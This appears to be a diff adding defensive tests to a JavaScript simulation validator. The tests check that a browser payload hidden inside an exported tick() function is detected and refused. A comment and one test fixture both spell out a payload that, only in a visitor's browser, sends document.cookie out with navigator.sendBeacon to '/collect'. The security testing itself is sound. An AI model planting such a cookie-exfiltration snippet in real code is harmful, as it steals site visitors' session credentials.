@@ -1,3 +1,4 @@
+import { browserOnlyReferences, topLevelSideEffects } from "../src/worldEdit.js";
 // FOUNDATION-2 ("emit the change, not the file"): validates the structured
 // WorldEdit path end to end using the REAL current source (SIM_BASELINE_SOURCE),
 // never a hand-typed stand-in -- an edit that doesn't apply correctly here
@@ -445,4 +446,83 @@ test("guardrail: recipe geometry with 3D X/Z rotation projecting height outside 
   });
   assert.equal(result.ok, false);
   if (!result.ok) assert.match(result.reason, /does not enclose recipe geometry envelope/);
+});
+
+// =============================================================================
+// A PAYLOAD IN A FUNCTION BODY IS NOT A MODULE-LOAD SIDE EFFECT
+//
+// topLevelSideEffects deliberately does not descend into function bodies, and
+// that is correct for the question it asks: a function is defined at load and
+// called later. The hole is that the world's exported functions are imported
+// AND CALLED by the public pages, so a payload never needs to run at load — it
+// only needs to be in tick().
+//
+// An audit put this in tick()'s body:
+//
+//     if (typeof document !== "undefined" && !globalThis.__done) {
+//       globalThis.__done = 1; document.title = "PWNED";
+//       navigator.sendBeacon("/collect", document.cookie);
+//     }
+//
+// and every server-side check passed: side effects [], integrity checks all
+// pass, 0 of 9 regressions failed. The sandbox runs in a Worker isolate with no
+// DOM, so the guard branch is dead there and live in every visitor's browser.
+// The tests could not see it by construction.
+// =============================================================================
+test("a browser payload hidden inside a function body is refused", () => {
+  const payload = `
+export function tick(w) {
+  if (typeof document !== "undefined" && !globalThis.__done) {
+    globalThis.__done = 1;
+    document.title = "PWNED";
+    navigator.sendBeacon("/collect", document.cookie);
+  }
+  return w;
+}`;
+  // The module-load check cannot see it — that is not a bug in that check.
+  assert.deepEqual(topLevelSideEffects(payload), [],
+    "guard: the module-load check genuinely cannot see a payload in a body");
+
+  const refs = browserOnlyReferences(payload);
+  assert.ok(refs.length > 0, "a browser payload in a function body must be refused");
+  const named = refs.join(" ");
+  for (const g of ["document", "navigator", "globalThis"]) {
+    assert.match(named, new RegExp(g), `${g} should be named in the refusal`);
+  }
+});
+
+test("ordinary simulation code is not refused", () => {
+  // The check has to be usable. A pure simulation touches none of these.
+  const honest = `
+const RATE = 0.4;
+export function tick(w) {
+  const hunger = Math.min(100, w.hunger + RATE);
+  const money = w.money - (hunger > 80 ? 5 : 0);
+  return { ...w, hunger, money, tick: w.tick + 1 };
+}
+export function chooseAction(w) { return w.hunger > 80 ? "eat" : "work"; }`;
+  assert.deepEqual(browserOnlyReferences(honest), [],
+    "a pure simulation must pass — a check that refuses honest code is not usable");
+  assert.deepEqual(topLevelSideEffects(honest), []);
+});
+
+test("a local binding that shadows a browser global is not a false positive", () => {
+  // `document` as a parameter name is not the DOM.
+  const shadowed = `
+export function tick(w) {
+  const render = (document) => document.length;
+  return { ...w, n: render("abc") };
+}`;
+  assert.deepEqual(browserOnlyReferences(shadowed), [],
+    "a shadowed name is not the global");
+});
+
+test("the shipped world source itself passes both checks", () => {
+  // The most important case. A gate that refuses the world it is guarding is
+  // not a gate, it is an outage — and this one scans every identifier at every
+  // depth, so it is exactly the kind of check that can over-reach.
+  assert.deepEqual(topLevelSideEffects(SIM_BASELINE_SOURCE), [],
+    "the baseline world must have no module-load side effects");
+  assert.deepEqual(browserOnlyReferences(SIM_BASELINE_SOURCE), [],
+    "the baseline world must not reference a browser — if it does, this check cannot ship");
 });
